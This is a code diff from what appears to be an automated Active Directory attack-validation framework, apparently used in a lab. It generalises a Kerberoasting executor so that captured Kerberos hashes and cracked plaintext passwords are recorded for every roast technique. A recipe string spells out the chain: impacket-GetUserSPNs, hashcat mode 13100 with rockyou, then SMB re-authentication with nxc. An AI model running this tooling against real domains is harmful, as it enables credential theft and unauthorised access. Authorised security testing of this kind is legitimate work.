@@ -197,10 +197,9 @@ class _RoastExecutor(ValidationExecutor):
         att, res, _roast_won = first_successful(ctx.runner, attempts,
                                                 timeout=cfg.tool_timeout_s)
         hashes = self.hash_re.findall(res.stdout or "")
-        if self.technique == "KERBEROAST":
-            artifact["_reveal"].extend(
-                SecretReveal(self.technique, "crackable_hash", principal, blob)
-                for blob in hashes)
+        artifact["_reveal"].extend(
+            SecretReveal(self.technique, "crackable_hash", principal, blob)
+            for blob in hashes)
         roast_ok = bool(hashes)
         record("roast", att.argv, res, roast_ok,
                note=(f"via {att.tool}; {len(hashes)} hash(es)" if roast_ok else "no hash"))
@@ -231,7 +230,7 @@ class _RoastExecutor(ValidationExecutor):
                      "--potfile-path", str(potfile), "--outfile-format", "2", "--quiet"]
         res_show = ctx.runner.run(show_argv, timeout=cfg.tool_timeout_s, cwd=str(out_dir))
         plaintext = self._first_plaintext(res_show.stdout or "")
-        if plaintext and self.technique == "KERBEROAST":
+        if plaintext:
             artifact["_reveal"].append(SecretReveal(
                 self.technique, "password", principal, plaintext))
         crack_ok = bool(plaintext)
@@ -261,6 +260,9 @@ class _RoastExecutor(ValidationExecutor):
         complete = reauth_ok
         return finish(steps, gate, mutation, terminal_fact, complete, errors)
 
+    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
+        return list(artifact.get("_reveal", []))
+
     # ---------------------------------------------------------------- helpers
     @staticmethod
     def _first_plaintext(show_stdout: str) -> Optional[str]:
@@ -286,9 +288,6 @@ class KerberoastExecutor(_RoastExecutor):
     _hash_name = "$krb5tgs$"
     recipe_ref = ("#66146 KERBEROAST = impacket-GetUserSPNs -request -> $krb5tgs$ "
                   "-> hashcat -m 13100 rockyou -> reauth nxc smb (PROVED jon.snow)")
-
-    def revealed_secrets(self, artifact: dict) -> list[SecretReveal]:
-        return list(artifact.get("_reveal", []))
 
     def _roast_argv(self, ctx, principal, op_target, op_extra) -> list[str]:
         argv = ["impacket-GetUserSPNs", op_target, "-dc-ip", ctx.config.dc_ip,
